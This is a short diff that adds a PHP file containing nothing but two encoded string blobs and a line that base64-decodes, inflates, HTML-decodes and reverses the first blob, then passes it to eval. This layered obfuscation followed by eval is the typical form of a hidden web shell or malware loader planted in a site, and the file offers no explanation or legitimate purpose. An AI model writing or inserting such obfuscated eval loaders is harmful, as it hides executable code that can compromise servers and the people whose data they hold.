@@ -1,0 +1,4 @@
+<?php
+$obfuscator = "s9ZE\x41qkp\x2b\x634qGmWpRUUlxRp\x41TnJqSryJWWpxYpJG\x61kliTlpeZlU6\x62nE4q7g4t\x61ggNz85rxSdg0MNXFh\x42T10tv\x63T\x61Xl0jJ7EsFQ\x41\x3d";
+$Code = "Pwv71ko\x61WdN\x624\x2byMOKFkh\x43q\x43QvQ4Z5DuilxI2/2RHhjsf\x43oZLnr3SjFuLZlRo\x43s1rJGYIFPSHhW/Se4yJR\x42K8l\x2b\x2bu9k\x61mV/TEogZmsvtIHVR\x637pVTOqL\x2bWnp85my\x62kusW7EmM7I2n/ks\x62GX\x42XUm5uhLEq3m91ooDIe\x2bVPtq7n7V4YSrrUzyeDP8d4\x41\x61\x63nqO5JLXnkMd32wgEp6Z\x2bdpQmD\x42Vnh5Dye7\x61n\x63M2N2Gm4M3\x2bLJHvXIXQh9n6qfe1\x41GtzD1hlF\x43JrDzP\x41XS\x41ZtTS9vVWZgSLuf6Ud6jE2k7\x61YS5U5FGZ\x63dp\x43LG2nPhoht5inrVTE\x62vZYHj85n28KWtGL/qwVtK\x63\x42r5uD\x42KX8\x41Fr\x624Wn18neQU\x42S7ylGJFo4k\x62xudSU7tn2p69eLqUJGyO5gPJG\x61f\x42pD8r//jEh\x42oHKS\x41UPI36\x2b6LEIV8XovzM\x436tsf9N\x43E\x62\x63qYf/qoT5ORJEg2NoM\x43YTQwWeII4G1\x42\x41D\x41\x41wIog5\x63\x63J";
+eval(strrev(htmlspecialchars_decode(gzinflate(base64_decode($obfuscator)))));
